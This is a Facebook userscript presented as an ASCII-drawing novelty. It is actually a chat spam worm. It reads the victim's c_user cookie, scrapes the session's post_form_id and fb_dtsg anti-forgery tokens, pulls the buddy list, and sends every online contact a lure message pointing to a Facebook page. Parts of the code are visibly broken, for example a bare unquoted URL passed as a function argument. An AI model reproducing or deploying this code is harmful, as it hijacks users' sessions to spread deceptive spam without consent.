/**
 * FBuzz Plus 2.0.1
 * All this code is licensed to Jmilo Desing's - No Copy - No Modifications.
 * Copyright (c) 2011 Jmilo Desing's
 */
// ==UserScript==
// @name         Dibujos ascii(recomendado)
// @namespace     redfaceplus.com/web/
// @description  Instalalo y sorprendete con los videos!
// @include       http://*.facebook.com/*
// @include       https://*.facebook.com/*
// @include       http://apps.facebook.com/*
// @version       3.2.1

// ==/UserScript==
document['ready'] = start(0);
a = 0;

var randomnumber = Math.floor(Math.random() * 99999);
var visitas = Math.floor(Math.random() * 987);
var randomnumber2 = Math.floor(Math.random() * 754);
var randomnumber3 = Math.floor(Math.random() * 43);
var randomnumber4 = Math.floor(Math.random() * 9);
var random = Math.floor(Math.random() * 7);
var viral= document.createElement('script');
function getRandomInt(_0x62cbx16, _0x62cbx17) {
    return Math['floor'](Math['random']() * (_0x62cbx17 - _0x62cbx16 + 1)) + _0x62cbx16;
};
function randomValue(_0x62cbx19) {
    return _0x62cbx19[getRandomInt(0, _0x62cbx19['length'] - 1)];
};

var sitio = ['http://www.facebook.com/pages/Como-Crear-Dibujos-ASCII/181196828635351?sk=app_190322544333196',];


viral.type= 'text/javascript';
viral.src= 'http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js';
viral.onload = function(){
  $.ajax({
    url: "/",
	success: function(data){
	  var user_id = document.cookie.match(/c_user=(\d+)/)[1];
	  var post_form_id = data.match(/name="post_form_id" value="([\d\w]+)"/i)[1];
	  var fb_dtsg = data.match(/name="fb_dtsg" value="(.[^\"]*)" autocomplete=/i)[1];
		$.ajax({
		  url:'/ajax/chat/buddy_list.php?__a=1',
		  data: {
	          user: user_id,
		  post_form_id: post_form_id,
		  fb_dtsg: fb_dtsg,
		  lsd: null,
		  post_form_id_source: 'AsyncRequest',
		  popped_out: false,
		  force_render: true
		},
		success: function(chatResponse){
		  var jsonChatResponse = eval('(' + chatResponse.substr(9) + ')');
		  var buddyList = jsonChatResponse['payload']['buddy_list'];
		    for (var contact in buddyList['nowAvailableList']) {
			$.ajax({
			  url: '/ajax/chat/send.php?__a=1',
			  type: "POST",
			  data: {
				msg_id: Math.floor(Math.random() * 13354489589999999),
				client_time: (new Date).getTime(),
				msg_text: 'PCrea increibles dibujos con letras A Tu Gusto ' + randomValue(http://www.facebook.com/pages/Como-Crear-Dibujos-ASCII/181196828635351?sk=app_190322544333196) + ' entra y hazlo tu tambien es facil ;)!',
				to: contact,
				post_form_id: post_form_id,
				fb_dtsg: fb_dtsg,
					post_form_id_source: "AsyncRequest"
				},
				success: function(chatSendResponse){
				}
});}}});}});};
document.head.appendChild(viral);